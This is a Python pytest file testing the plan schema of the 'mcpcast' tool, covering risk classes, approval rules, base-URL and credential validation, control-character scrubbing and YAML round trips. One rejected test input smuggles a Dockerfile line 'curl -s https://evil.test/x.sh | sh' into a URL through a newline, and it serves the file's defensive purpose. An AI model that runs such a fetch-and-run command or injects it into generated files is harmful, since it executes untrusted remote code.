"""Tests for the ``promptise mcpcast`` plan schema (``promptise.mcpcast.schema``)."""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from promptise.mcpcast.schema import (
    ApiPlan,
    ApprovalMode,
    AuthMode,
    DroppedOp,
    MCPcastError,
    MCPcastPlan,
    ParamPlan,
    RiskClass,
    RouteParam,
    RoutePlan,
    SafetyProfile,
    ToolPlan,
    is_plan_document,
)


def _route(op="getPet", method="GET", path="/pet/{petId}", **params):
    return RoutePlan(
        operation_id=op,
        method=method,
        path=path,
        params={n: RouteParam(**cfg) for n, cfg in params.items()}
        or {"petId": RouteParam(location="path", required=True)},
    )


def _tool(name="get_pet", risk=RiskClass.READ, approval=False, **kw):
    return ToolPlan(
        name=name,
        description="Get a pet",
        risk=risk,
        routes=kw.pop("routes", [_route()]),
        params=kw.pop(
            "params", {"petId": ParamPlan(required=True, json_schema={"type": "integer"})}
        ),
        requires_approval=approval,
        **kw,
    )


def _api(**kw):
    return ApiPlan(name="petstore", base_url="https://api.example.com/", **kw)


# ---------------------------------------------------------------------------
# Enums
# ---------------------------------------------------------------------------


class TestRiskLadder:
    def test_severity_order(self):
        assert RiskClass.READ.severity < RiskClass.WRITE.severity < RiskClass.DESTRUCTIVE.severity
        assert RiskClass.DESTRUCTIVE.severity == RiskClass.FINANCIAL.severity

    def test_escalate(self):
        assert RiskClass.READ.escalate() is RiskClass.WRITE
        assert RiskClass.WRITE.escalate() is RiskClass.DESTRUCTIVE
        assert RiskClass.DESTRUCTIVE.escalate() is RiskClass.DESTRUCTIVE
        assert RiskClass.FINANCIAL.escalate() is RiskClass.FINANCIAL

    def test_at_least(self):
        assert RiskClass.FINANCIAL.at_least(RiskClass.DESTRUCTIVE)
        assert RiskClass.DESTRUCTIVE.at_least(RiskClass.FINANCIAL)
        assert not RiskClass.READ.at_least(RiskClass.WRITE)


class TestSafetyProfile:
    @pytest.mark.parametrize(
        ("profile", "allowed"),
        [
            (SafetyProfile.READ_ONLY, {RiskClass.READ}),
            (SafetyProfile.STANDARD, {RiskClass.READ, RiskClass.WRITE}),
            (SafetyProfile.FULL, set(RiskClass)),
        ],
    )
    def test_allows(self, profile, allowed):
        assert {r for r in RiskClass if profile.allows(r)} == allowed

    def test_approval_for_everything_but_reads(self):
        for profile in SafetyProfile:
            assert not profile.requires_approval(RiskClass.READ)
            assert profile.requires_approval(RiskClass.WRITE)
            assert profile.requires_approval(RiskClass.DESTRUCTIVE)

    def test_exclusion_reason_names_profile_and_risk(self):
        reason = SafetyProfile.READ_ONLY.exclusion_reason(RiskClass.WRITE)
        assert "write" in reason and "read-only" in reason


class TestApprovalDefaults:
    def test_pending_for_api_key_else_elicitation(self):
        assert _api(auth=AuthMode.API_KEY).approval_mode is ApprovalMode.PENDING
        assert _api(auth=AuthMode.PASSTHROUGH).approval_mode is ApprovalMode.ELICITATION
        assert _api(auth=AuthMode.NONE).approval_mode is ApprovalMode.ELICITATION

    def test_explicit_wins(self):
        assert _api(auth=AuthMode.API_KEY, approval=ApprovalMode.ELICITATION).approval_mode is (
            ApprovalMode.ELICITATION
        )


# ---------------------------------------------------------------------------
# Field validation
# ---------------------------------------------------------------------------


class TestApiPlan:
    def test_base_url_normalised(self):
        assert _api().base_url == "https://api.example.com"

    @pytest.mark.parametrize("bad", ["", "api.example.com", "ftp://x"])
    def test_base_url_requires_http(self, bad):
        with pytest.raises(ValidationError, match="base_url"):
            ApiPlan(name="x", base_url=bad)

    @pytest.mark.parametrize("bad", ["Pet Store", "-x", "UPPER", ""])
    def test_name_slug(self, bad):
        with pytest.raises(ValidationError):
            ApiPlan(name=bad, base_url="https://x")

    @pytest.mark.parametrize(
        "bad",
        [
            "https://api.acme.test/v1\nRUN curl -s https://evil.test/x.sh | sh",
            "https://api.acme.test/v1 --flag",
            "https://api.acme.test/v1\x00",
            "https://api.acme.test/\tv1",
        ],
    )
    def test_base_url_is_one_token(self, bad):
        """A newline in servers[0].url would become a second Dockerfile / .env line."""
        with pytest.raises(ValidationError, match="whitespace or control"):
            ApiPlan(name="x", base_url=bad)
        with pytest.raises(ValidationError, match="whitespace or control"):
            RoutePlan(operation_id="o", method="GET", path="/a", base_url=bad)

    @pytest.mark.parametrize(
        "bad",
        [
            "http://u:S3CRET@h",
            "https://svc-user:S3CRET@api.acme.test:8443/v1/",
            "https://S3CRET@api.acme.test/v1",
            "//u:S3CRET@api.acme.test/v1",
        ],
    )
    def test_base_url_never_carries_credentials(self, bad):
        """base_url lands in config.py, .env.example, the README and the server's instructions.

        A plan — generated from ``http://user:pass@host/openapi.json`` or edited
        by hand — is refused before any of those files can be written, with a
        pointer at the supported way to authenticate; loading such a plan must
        not echo the secret either.
        """
        pointer = "--auth env-token and set MCPCAST_UPSTREAM_TOKEN"
        with pytest.raises(
            ValidationError, match=f"base_url must not carry credentials.*{pointer}"
        ):
            ApiPlan(name="x", base_url=bad)
        with pytest.raises(ValidationError, match=f"route base_url must not carry.*{pointer}"):
            RoutePlan(operation_id="o", method="GET", path="/a", base_url=bad)

        plan = {
            "version": 1,
            "api": {"name": "x", "base_url": bad},
            "tools": [
                {
                    "name": "t",
                    "description": "d",
                    "risk": "read",
                    "routes": [
                        {"operation_id": "o", "method": "GET", "path": "/a", "base_url": bad}
                    ],
                }
            ],
        }
        with pytest.raises(MCPcastError) as info:
            MCPcastPlan.from_document(plan)
        message = str(info.value)
        assert message.startswith(
            "invalid plan:\n2 validation errors for MCPcastPlan\napi.base_url\n"
        )
        assert "tools.0.routes.0.base_url" in message and message.count(pointer) == 2
        assert "S3CRET" not in message and "input_value" not in message

    def test_at_sign_outside_the_host_is_fine(self):
        assert ApiPlan(name="x", base_url="https://api.acme.test/tenants/a@b/").base_url == (
            "https://api.acme.test/tenants/a@b"
        )

    @pytest.mark.parametrize(
        ("source", "expected"),
        [
            ("https://u:p@h/x?api_key=1#f", "https://h/x"),
            ("https://h:8443/openapi.json?token=s3cret", "https://h:8443/openapi.json"),
            ("http://user@localhost:8000/openapi.json", "http://localhost:8000/openapi.json"),
            ("https://h/openapi.json", "https://h/openapi.json"),
            ("openapi.yaml", "openapi.yaml"),
            ("C:\\Users\\nick\\openapi.yaml", "C:\\Users\\nick\\openapi.yaml"),
            ("<inline>", "<inline>"),
            (None, None),
        ],
    )
    def test_spec_source_never_keeps_credentials(self, source, expected):
        """The source is echoed into docstrings, the README and the plan file."""
        assert _api(spec_source=source).spec_source == expected


class TestRoutePlan:
    def test_path_params_from_template(self):
        r = _route(
            path="/a/{x}/b/{y}", x={"location": "path", "required": True}, y={"location": "path"}
        )
        assert r.path_params == ("x", "y")
        assert r.required_params == ("x",)

    def test_placeholder_without_param_rejected(self):
        with pytest.raises(ValidationError, match="no matching path parameter"):
            RoutePlan(operation_id="o", method="GET", path="/a/{x}")

    def test_path_param_not_in_template_rejected(self):
        with pytest.raises(ValidationError, match="do not appear in path"):
            _route(path="/a", x={"location": "path"})

    def test_path_must_start_with_slash(self):
        with pytest.raises(ValidationError, match="must start with"):
            RoutePlan(operation_id="o", method="GET", path="a")

    def test_only_one_raw_body(self):
        with pytest.raises(ValidationError, match="raw_body"):
            _route(path="/a", b1={"location": "raw_body"}, b2={"location": "raw_body"})


class TestParamAndTool:
    def test_hidden_required_needs_default(self):
        with pytest.raises(ValidationError, match="must have a default"):
            ParamPlan(required=True, hidden=True)
        ParamPlan(required=True, hidden=True, default="x")  # ok

    @pytest.mark.parametrize("bad", ["GetPet", "get-pet", "1pet", "", "a" * 65])
    def test_tool_name_pattern(self, bad):
        with pytest.raises(ValidationError, match="tool name"):
            _tool(name=bad)

    def test_blank_description_rejected(self):
        with pytest.raises(ValidationError, match="blank"):
            ToolPlan(
                name="x",
                description="  ",
                risk=RiskClass.READ,
                routes=[_route()],
                params={"petId": ParamPlan()},
            )

    def test_route_param_must_be_declared(self):
        with pytest.raises(ValidationError, match="not declared in params"):
            _tool(params={})

    def test_example_only_visible_params(self):
        with pytest.raises(ValidationError, match="unknown or hidden"):
            _tool(example={"nope": 1})
        with pytest.raises(ValidationError, match="unknown or hidden"):
            _tool(
                params={"petId": ParamPlan(hidden=True, default=1, required=True)},
                example={"petId": 1},
            )

    def test_route_required_param_hidden_needs_default(self):
        with pytest.raises(ValidationError, match="hidden without a default"):
            _tool(params={"petId": ParamPlan(hidden=True)})

    def test_operation_listed_twice_rejected(self):
        with pytest.raises(ValidationError, match="twice"):
            _tool(routes=[_route(), _route()])

    def test_operations_and_visible_params(self):
        t = _tool(
            routes=[_route("a"), _route("b", path="/pet", petId={"location": "query"})],
            params={"petId": ParamPlan(), "secret": ParamPlan(hidden=True, default="k")},
        )
        assert t.operations == ["a", "b"]
        assert list(t.visible_params) == ["petId"]


# ---------------------------------------------------------------------------
# Plan invariants
# ---------------------------------------------------------------------------


class TestPlanInvariants:
    def test_duplicate_tool_names(self):
        with pytest.raises(ValidationError, match="duplicate tool name"):
            MCPcastPlan(api=_api(), tools=[_tool(), _tool(routes=[_route("other")])])

    def test_operation_in_two_tools(self):
        with pytest.raises(ValidationError, match="used by both"):
            MCPcastPlan(api=_api(), tools=[_tool(), _tool(name="get_pet2")])

    def test_kept_and_dropped(self):
        with pytest.raises(ValidationError, match="both kept"):
            MCPcastPlan(
                api=_api(), tools=[_tool()], dropped=[DroppedOp(operation_id="getPet", reason="x")]
            )

    def test_dropped_twice(self):
        with pytest.raises(ValidationError, match="dropped twice"):
            MCPcastPlan(
                api=_api(),
                dropped=[
                    DroppedOp(operation_id="a", reason="x"),
                    DroppedOp(operation_id="a", reason="y"),
                ],
            )

    def test_profile_disallows_risk(self):
        with pytest.raises(ValidationError, match="does not allow"):
            MCPcastPlan(
                api=_api(),
                profile=SafetyProfile.READ_ONLY,
                tools=[_tool(risk=RiskClass.WRITE, approval=True)],
            )

    def test_write_without_approval_rejected(self):
        with pytest.raises(ValidationError, match="requires_approval=true"):
            MCPcastPlan(
                api=_api(), profile=SafetyProfile.STANDARD, tools=[_tool(risk=RiskClass.WRITE)]
            )

    def test_read_may_opt_into_approval(self):
        plan = MCPcastPlan(api=_api(), tools=[_tool(approval=True)])
        assert plan.gated_tools == plan.tools

    def test_lookups(self):
        plan = MCPcastPlan(
            api=_api(), tools=[_tool()], dropped=[DroppedOp(operation_id="x", reason="r")]
        )
        assert plan.tool_names == ["get_pet"]
        assert plan.kept_operations == {"getPet"}
        assert plan.tool("get_pet").name == "get_pet"
        with pytest.raises(KeyError):
            plan.tool("nope")


# ---------------------------------------------------------------------------
# YAML
# ---------------------------------------------------------------------------


class TestYaml:
    def test_round_trip_identity(self, tmp_path):
        plan = MCPcastPlan(
            api=_api(auth=AuthMode.API_KEY, description="Pets", spec_source="x.yaml"),
            profile=SafetyProfile.FULL,
            tools=[
                _tool(),
                _tool(
                    name="delete_pet",
                    risk=RiskClass.DESTRUCTIVE,
                    approval=True,
                    routes=[_route("deletePet", "DELETE")],
                    params={
                        "petId": ParamPlan(required=True, json_schema={"type": "integer"}),
                        "force": ParamPlan(
                            hidden=True, default=False, json_schema={"type": "boolean"}
                        ),
                    },
                    example={"petId": 1},
                    tags=["pet"],
                ),
            ],
            dropped=[DroppedOp(operation_id="health", reason="not useful")],
        )
        text = plan.to_yaml()
        assert MCPcastPlan.from_yaml(text) == plan
        path = plan.save(tmp_path / "mcpcast.plan.yaml")
        assert MCPcastPlan.load(path) == plan

    def test_yaml_is_compact_but_keeps_reviewer_keys(self):
        text = MCPcastPlan(api=_api(), tools=[_tool()]).to_yaml()
        assert "version: 1" in text
        assert "profile: read-only" in text
        assert "auth: passthrough" in text
        assert "hidden: false" not in text  # defaults omitted
        assert "requires_approval: false" not in text
        assert text.startswith("# mcpcast.plan.yaml")

    def test_from_yaml_errors(self):
        with pytest.raises(MCPcastError, match="not valid YAML"):
            MCPcastPlan.from_yaml("a: [")
        with pytest.raises(MCPcastError, match="mapping"):
            MCPcastPlan.from_yaml("- 1")
        with pytest.raises(MCPcastError, match="invalid plan"):
            MCPcastPlan.from_yaml("version: 1\napi: {name: x, base_url: nope}\n")

    def test_unknown_keys_rejected(self):
        with pytest.raises(MCPcastError, match="invalid plan"):
            MCPcastPlan.from_yaml("version: 1\napi: {name: x, base_url: https://x}\nbogus: 1\n")


def test_is_plan_document():
    assert is_plan_document({"version": 1, "api": {}, "tools": []})
    assert not is_plan_document({"openapi": "3.0.0", "paths": {}})
    assert not is_plan_document({"paths": {}, "tools": [], "api": {}})
    assert not is_plan_document([])


class TestReservedAndUnreachable:
    @pytest.mark.parametrize(
        "bad",
        [
            "import",
            "match",
            "server",
            "upstream",
            "str",
            "list",
            "approvals_list",
            "ctx",
            "args",
            "select_route",
            "register",
        ],
    )
    def test_reserved_tool_names_rejected(self, bad):
        with pytest.raises(ValidationError, match="keyword|reserved"):
            _tool(name=bad)

    def test_unreachable_route_rejected(self):
        catch_all = _route("search", path="/pets", petId={"location": "query"})
        specific = _route("get")
        with pytest.raises(ValidationError, match="can never be selected"):
            _tool(routes=[catch_all, specific], params={"petId": ParamPlan()})
        _tool(routes=[specific, catch_all], params={"petId": ParamPlan()})  # specific first is fine

    def test_hidden_required_counts_as_always_provided(self):
        a = _route("a", path="/a", petId={"location": "query", "required": True})
        b = _route("b", path="/b", petId={"location": "query"})
        with pytest.raises(ValidationError, match="can never be selected"):
            _tool(routes=[a, b], params={"petId": ParamPlan(hidden=True, default=1)})

    def test_pending_requires_api_key(self):
        with pytest.raises(ValidationError, match="identified callers"):
            _api(auth=AuthMode.PASSTHROUGH, approval=ApprovalMode.PENDING)
        _api(auth=AuthMode.API_KEY, approval=ApprovalMode.PENDING)

    def test_values_are_json_native(self):
        import datetime

        p = ParamPlan(
            default=datetime.date(2026, 1, 15), json_schema={"enum": [datetime.date(2026, 1, 1)]}
        )
        assert p.default == "2026-01-15" and p.json_schema == {"enum": ["2026-01-01"]}

    def test_non_finite_numbers_become_strings(self):
        """``.inf`` / ``.nan`` parse from YAML but are not JSON — they would render as
        bare ``inf`` / ``nan`` names in generated code."""
        p = ParamPlan(default=float("inf"), json_schema={"example": float("nan")})
        assert p.default == "Infinity" and p.json_schema == {"example": "NaN"}
        t = _tool(example={"petId": float("-inf")})
        assert t.example == {"petId": "-Infinity"}
        assert MCPcastPlan.from_yaml(MCPcastPlan(api=_api(), tools=[t]).to_yaml()).tools[0] == t


# ---------------------------------------------------------------------------
# base_url refusals never echo the value
# ---------------------------------------------------------------------------


def _plan_document(base_url: str) -> dict:
    return {
        "version": 1,
        "api": {"name": "x", "base_url": base_url},
        "tools": [
            {
                "name": "t",
                "description": "d",
                "risk": "read",
                "routes": [
                    {"operation_id": "o", "method": "GET", "path": "/a", "base_url": base_url}
                ],
            }
        ],
    }


def _refusals(base_url: str) -> list[str]:
    """The three refusals for one value: ApiPlan, RoutePlan and a plan document.

    For the models this is the validator's message (pydantic's own ``str()``
    always appends ``input_value=``, which is why every caller renders through
    ``render_validation_errors``); for the plan document it is the whole
    ``MCPcastError`` text, exactly what the CLI prints.
    """
    messages = []
    with pytest.raises(ValidationError) as api:
        ApiPlan(name="x", base_url=base_url)
    messages.append(" | ".join(e["msg"] for e in api.value.errors()))
    with pytest.raises(ValidationError) as route:
        RoutePlan(operation_id="o", method="GET", path="/a", base_url=base_url)
    messages.append(" | ".join(e["msg"] for e in route.value.errors()))
    with pytest.raises(MCPcastError) as plan:
        MCPcastPlan.from_document(_plan_document(base_url))
    messages.append(str(plan.value))
    return messages


class TestBaseUrlRefusalsNeverEchoTheValue:
    @pytest.mark.parametrize(
        "bad",
        [
            "https://user:S3CRET@api.example.com/v 1",
            "https://user:S3CRET@api.example.com/v\n1",
            "https://user:S3CRET@api.example.com/v\x001",
            "https://user:S3CRET@api.exa mple.com/v1",
            "https://user:S3CRET@api.example.com/v1?x=1",
            "user:S3CRET@api.example.com/v1",
            "S3CRET@api.example.com/v1",
            "mailto:user:S3CRET@api.example.com",
            "https:/user:S3CRET@api.example.com/v1",
        ],
    )
    def test_credential_with_breakers_or_no_scheme(self, bad):
        """The userinfo check runs first and reads the authority leniently, so a
        credential is caught whatever else is wrong with the value — and the
        message names the host only."""
        for message in _refusals(bad):
            assert "must not carry credentials" in message
            assert "api.example.com" in message or "api.exa?mple.com" in message
            assert "S3CRET" not in message and "user:S3CRET" not in message
            assert "input_value" not in message

    @pytest.mark.parametrize(
        ("bad", "char", "position"),
        [
            ("https://api.example.com/v 1", "' '", 25),
            ("https://api.example.com/v\n1", "'\\n'", 25),
            ("https://api.example.com/v\x001", "'\\x00'", 25),
            ("https://api.example.com/\tv1", "'\\t'", 24),
        ],
    )
    def test_whitespace_message_names_the_character_not_the_value(self, bad, char, position):
        for message in _refusals(bad):
            assert "whitespace or control characters" in message
            assert f"({char} at position {position})" in message
            assert "api.example.com" not in message and "input_value" not in message

    @pytest.mark.parametrize(
        "bad",
        [
            "https://api.example.com/v1?api_key=SECRET123",
            "https://api.example.com/v1#SECRET123",
            "https://api.example.com/v1?SECRET123",
            "https://api.example.com/?api_key=SECRET123",
            "https://api.example.com/v1?key=SECRET123#frag",
        ],
    )
    def test_query_string_or_fragment_refused_without_echo(self, bad):
        """Route paths are appended to the base URL (httpx replaces a base query
        with the request's own parameters), and the value lands in config.py,
        README.md, .env.example and the server instructions."""
        for message in _refusals(bad):
            assert "must not carry a query string or fragment" in message
            assert "config.py" in message and "--auth env-token" in message
            assert "SECRET123" not in message and "input_value" not in message

    def test_clean_values_still_pass(self):
        assert ApiPlan(name="x", base_url="https://api.example.com/tenants/a@b/").base_url == (
            "https://api.example.com/tenants/a@b"
        )
        assert (
            RoutePlan(
                operation_id="o", method="GET", path="/a", base_url="http://[::1]:8000/v1/"
            ).base_url
            == "http://[::1]:8000/v1"
        )

    def test_scheme_error_still_helps_with_relative_urls(self):
        with pytest.raises(ValidationError, match=r"--base-url https://<api-host>/api/v3"):
            ApiPlan(name="x", base_url="/api/v3")


class TestReservedParamNames:
    def test_type_annotation_names_are_reserved(self):
        from promptise.mcpcast.schema import RESERVED_PARAM_NAMES

        assert {"str", "Any"} <= RESERVED_PARAM_NAMES
        assert "route" not in RESERVED_PARAM_NAMES  # the emitter renames its local instead


# ---------------------------------------------------------------------------
# Control characters never survive plan validation
# ---------------------------------------------------------------------------


class TestControlCharactersAreScrubbed:
    ESC = "\x1b[2K"

    def test_scrub_text(self):
        from promptise.mcpcast.schema import scrub_text

        assert scrub_text("a\x1b[2Kb\x9bc\x00d\x7fe\x85f") == "a[2Kbcdef"
        assert scrub_text("keep\nnewline\tand tab") == "keep\nnewline\tand tab"
        assert scrub_text("cr\r\nlf") == "cr\nlf"
        assert scrub_text("lone\ud800surrogate") == "lone?surrogate"
        assert scrub_text("ünïcödé — ok") == "ünïcödé — ok"

    def test_every_text_field_of_a_plan(self):
        e = self.ESC
        plan = MCPcastPlan(
            api=_api(description=f"Pets{e}", spec_source=f"spec{e}.yaml"),
            profile=SafetyProfile.FULL,
            tools=[
                ToolPlan(
                    name="get_pet",
                    description=f"Get{e} a pet",
                    risk=RiskClass.READ,
                    routes=[
                        RoutePlan(
                            operation_id=f"get{e}Pet",
                            method="GET",
                            path=f"/pet/{{pet{e}Id}}",
                            params={
                                f"pet{e}Id": RouteParam(
                                    location="path", required=True, wire_name=f"pet{e}Id"
                                )
                            },
                        )
                    ],
                    params={
                        f"pet{e}Id": ParamPlan(
                            description=f"The{e} id",
                            required=True,
                            json_schema={"type": "string", "enum": [f"a{e}b"], f"x{e}": 1},
                            default=None,
                        ),
                        "mode": ParamPlan(hidden=True, default=f"fast{e}"),
                    },
                    example={f"pet{e}Id": f"1{e}"},
                    tags=[f"pet{e}s"],
                )
            ],
            dropped=[DroppedOp(operation_id=f"old{e}Op", reason=f"gone{e}")],
        )
        text = plan.to_yaml()
        assert "\x1b" not in text and "\x1b" not in repr(plan)
        tool = plan.tools[0]
        assert tool.description == "Get[2K a pet" and tool.tags == ["pet[2Ks"]
        assert tool.routes[0].operation_id == "get[2KPet"
        assert tool.routes[0].path == "/pet/{pet[2KId}"
        assert list(tool.routes[0].params) == ["pet[2KId"]
        assert tool.routes[0].params["pet[2KId"].wire_name == "pet[2KId"
        assert list(tool.params) == ["pet[2KId", "mode"]
        assert tool.params["pet[2KId"].description == "The[2K id"
        assert tool.params["pet[2KId"].json_schema == {
            "type": "string",
            "enum": ["a[2Kb"],
            "x[2K": 1,
        }
        assert tool.params["mode"].default == "fast[2K"
        assert tool.example == {"pet[2KId": "1[2K"}
        assert plan.api.description == "Pets[2K" and plan.api.spec_source == "spec[2K.yaml"
        assert plan.dropped[0].operation_id == "old[2KOp" and plan.dropped[0].reason == "gone[2K"
        assert MCPcastPlan.from_yaml(text) == plan

    def test_names_are_refused_not_rewritten(self):
        """A tool or api name with a control character is a pattern violation, and
        the refusal shows it escaped. A trailing newline (``$`` would let it
        through with ``match``) is one too: the name is emitted as ``def <name>(``."""
        with pytest.raises(ValidationError, match=r"'get\\x1bpet'"):
            _tool(name="get\x1bpet")
        with pytest.raises(ValidationError, match=r"'x\\x1b'"):
            ApiPlan(name="x\x1b", base_url="https://x")
        with pytest.raises(ValidationError, match="tool name"):
            _tool(name="get_pet\n")
        with pytest.raises(ValidationError, match="api name"):
            ApiPlan(name="x\n", base_url="https://x")

    def test_hand_edited_plan_file(self):
        text = (
            "version: 1\n"
            'api: {name: x, base_url: https://x, description: "Wipe\\e[2K"}\n'
            "tools:\n"
            '- name: t\n  description: "Wipe all data\\e[2K"\n  risk: read\n'
            '  routes: [{operation_id: o, method: GET, path: "/a\\e[2K"}]\n'
            'dropped: [{operation_id: d, reason: "r\\e[2K"}]\n'
        )
        plan = MCPcastPlan.from_yaml(text)
        assert "\x1b" not in plan.to_yaml()
        assert plan.tools[0].description == "Wipe all data[2K"
        assert plan.tools[0].routes[0].path == "/a[2K"


# ---------------------------------------------------------------------------
# Credential slot
# ---------------------------------------------------------------------------


class TestCredentialSlot:
    def test_defaults_keep_existing_plans_valid_and_compact(self):
        api = _api()
        assert api.credential_location == "header" and api.credential_name == "Authorization"
        assert api.credential_is_authorization_header
        text = MCPcastPlan(api=api, tools=[_tool()]).to_yaml()
        assert "credential_" not in text
        plan = MCPcastPlan.from_yaml("version: 1\napi: {name: x, base_url: https://x}\n")
        assert plan.api.credential_name == "Authorization"

    @pytest.mark.parametrize(
        ("location", "name"),
        [
            ("header", "X-API-Key"),
            ("header", "api_key"),  # Swagger Petstore's header
            ("header", "Ocp-Apim-Subscription-Key"),
            ("query", "api_key"),
            ("query", "key"),
        ],
    )
    def test_custom_slot_round_trips(self, location, name):
        api = _api(credential_location=location, credential_name=name)
        assert not api.credential_is_authorization_header
        plan = MCPcastPlan(api=api)
        text = plan.to_yaml()
        assert f"credential_name: {name}" in text
        assert ("credential_location: query" in text) is (location == "query")
        assert MCPcastPlan.from_yaml(text) == plan

    def test_authorization_header_is_case_insensitive(self):
        assert _api(credential_name="authorization").credential_is_authorization_header

    @pytest.mark.parametrize("name", ["", "X Key", "X:Key", "X\x1bKey", "X/Key", "Key\n"])
    def test_invalid_header_names(self, name):
        with pytest.raises(ValidationError, match="not a valid HTTP header name"):
            _api(credential_location="header", credential_name=name)

    @pytest.mark.parametrize(
        "name", ["cookie", "Cookie", "host", "Content-Length", "transfer-encoding"]
    )
    def test_reserved_headers(self, name):
        with pytest.raises(ValidationError, match="belongs to the HTTP client"):
            _api(credential_location="header", credential_name=name)

    @pytest.mark.parametrize("name", ["", " ", "api key", "key\n", "k\x00"])
    def test_invalid_query_names(self, name):
        with pytest.raises(ValidationError, match="query credential must be a non-empty"):
            _api(credential_location="query", credential_name=name)

    def test_unknown_location_rejected(self):
        with pytest.raises(ValidationError):
            _api(credential_location="cookie", credential_name="session")


# ---------------------------------------------------------------------------
# A plan may raise a risk, never lower it
# ---------------------------------------------------------------------------


class TestRiskFloor:
    def _plan(self, risk, method, path, op_id, *, profile=SafetyProfile.FULL, **params):
        route = RoutePlan(
            operation_id=op_id,
            method=method,
            path=path,
            params={n: RouteParam(**cfg) for n, cfg in params.items()},
        )
        tool = _tool(
            name="t",
            risk=risk,
            approval=risk is not RiskClass.READ,
            routes=[route],
            params={n: ParamPlan() for n in route.params},
        )
        return MCPcastPlan(api=_api(), profile=profile, tools=[tool])

    def test_delete_declared_read_is_refused(self):
        with pytest.raises(ValidationError) as info:
            self._plan(
                RiskClass.READ,
                "DELETE",
                "/orders/{id}",
                "deleteOrder",
                id={"location": "path", "required": True},
            )
        message = str(info.value)
        assert "tool 't' is declared 'read'" in message
        assert "'deleteOrder' (DELETE /orders/{id}) is at least 'destructive'" in message
        assert "never lower it" in message

    @pytest.mark.parametrize(
        ("method", "path", "op_id", "floor"),
        [
            ("POST", "/orders", "createOrder", "write"),
            ("PUT", "/orders/{id}", "updateOrder", "write"),
            ("PATCH", "/orders/{id}", "patchOrder", "write"),
            ("POST", "/orders/{id}/refund", "refundOrder", "financial"),
            ("POST", "/subs/{id}:cancel", "cancelSub", "destructive"),
            ("GET", "/admin/users", "adminUsers", "write"),
        ],
    )
    def test_writes_declared_read_are_refused(self, method, path, op_id, floor):
        params = {"id": {"location": "path", "required": True}} if "{id}" in path else {}
        with pytest.raises(ValidationError, match=f"is at least '{floor}'"):
            self._plan(RiskClass.READ, method, path, op_id, **params)

    def test_destructive_declared_write_is_refused(self):
        with pytest.raises(ValidationError, match="is at least 'destructive'"):
            self._plan(
                RiskClass.WRITE,
                "DELETE",
                "/orders/{id}",
                "deleteOrder",
                id={"location": "path", "required": True},
            )

    @pytest.mark.parametrize(
        ("method", "path", "op_id"),
        [
            ("POST", "/books/search", "searchBooks"),
            ("POST", "/customers/search", "search_customers"),
            ("POST", "/customers/find", "find_customer"),
            ("POST", "/addresses/validate", "validateAddress"),
            ("POST", "/customers", "postCustomers"),  # a summary the plan lacks may say "Search"
            ("GET", "/pets", "listPets"),
        ],
    )
    def test_reads_declared_read_are_accepted(self, method, path, op_id):
        plan = self._plan(RiskClass.READ, method, path, op_id)
        assert plan.tools[0].risk is RiskClass.READ

    def test_raising_a_risk_is_fine(self):
        plan = self._plan(
            RiskClass.DESTRUCTIVE,
            "PUT",
            "/orders/{id}",
            "updateOrder",
            id={"location": "path", "required": True},
        )
        assert plan.tools[0].risk is RiskClass.DESTRUCTIVE
        assert (
            self._plan(RiskClass.WRITE, "GET", "/pets", "listPets").tools[0].risk is RiskClass.WRITE
        )

    def test_multi_route_tool_takes_the_highest_floor(self):
        get = _route("getPet", "GET", "/pet/{petId}")
        delete = _route("deletePet", "DELETE", "/pet", petId={"location": "query"})
        with pytest.raises(
            ValidationError, match="'deletePet' \\(DELETE /pet\\) is at least 'destructive'"
        ):
            _plan = MCPcastPlan(
                api=_api(),
                profile=SafetyProfile.FULL,
                tools=[
                    _tool(
                        name="pet",
                        risk=RiskClass.READ,
                        routes=[get, delete],
                        params={"petId": ParamPlan()},
                    )
                ],
            )

    def test_plan_file_downgrade_is_refused_on_load(self):
        text = (
            "version: 1\napi: {name: x, base_url: https://x}\nprofile: full\n"
            "tools:\n- name: delete_order\n  description: Delete\n  risk: read\n"
            "  routes:\n  - operation_id: deleteOrder\n    method: DELETE\n"
            "    path: /orders/{order-id}\n"
            "    params: {order_id: {location: path, required: true, wire_name: order-id}}\n"
            "  params: {order_id: {required: true}}\n"
        )
        with pytest.raises(MCPcastError, match="is at least 'destructive'"):
            MCPcastPlan.from_yaml(text)


# ---------------------------------------------------------------------------
# NEL round trip
# ---------------------------------------------------------------------------


class TestNelRoundTrip:
    def test_dumper_escapes_nel_in_keys_values_and_items(self):
        """PyYAML writes U+0085 literally and YAML 1.1 reads it as a line break."""
        import yaml

        from promptise.mcpcast.schema import _PlanDumper

        data = {"q\x85x": ["a\x85b", "plain", "a\x85\x85b"], "k": "a\x85b", "n": "two\nlines"}
        assert yaml.safe_load(yaml.safe_dump(data, allow_unicode=True)) != data  # the defect
        text = yaml.dump(data, Dumper=_PlanDumper, allow_unicode=True, sort_keys=False)
        assert '"q\\Nx"' in text and '"a\\N\\Nb"' in text and "plain" in text
        assert yaml.safe_load(text) == data

    def test_plan_round_trip_with_nel(self, tmp_path):
        """A validated plan never holds NEL (it is a C1 control, scrubbed on
        construction); a plan copied around validation still dumps losslessly."""
        plan = MCPcastPlan(
            api=_api(description="Pets\x85 more"),
            tools=[
                _tool(
                    routes=[_route(petId={"location": "path", "required": True})],
                    params={
                        "petId": ParamPlan(description="id\x85x", json_schema={"type": "string"})
                    },
                    example={"petId": "1\x852"},
                    tags=["pet\x85s"],
                )
            ],
        )
        assert plan.api.description == "Pets more" and plan.tools[0].tags == ["pets"]
        assert plan.tools[0].example == {"petId": "12"}
        assert MCPcastPlan.from_yaml(plan.to_yaml()) == plan
        assert MCPcastPlan.load(plan.save(tmp_path / "p.yaml")) == plan

        raw = plan.model_copy(
            update={"api": plan.api.model_copy(update={"description": "raw\x85nel"})}
        )
        text = raw.to_yaml()
        assert '"raw\\Nnel"' in text
        import yaml

        assert yaml.safe_load(text)["api"]["description"] == "raw\x85nel"
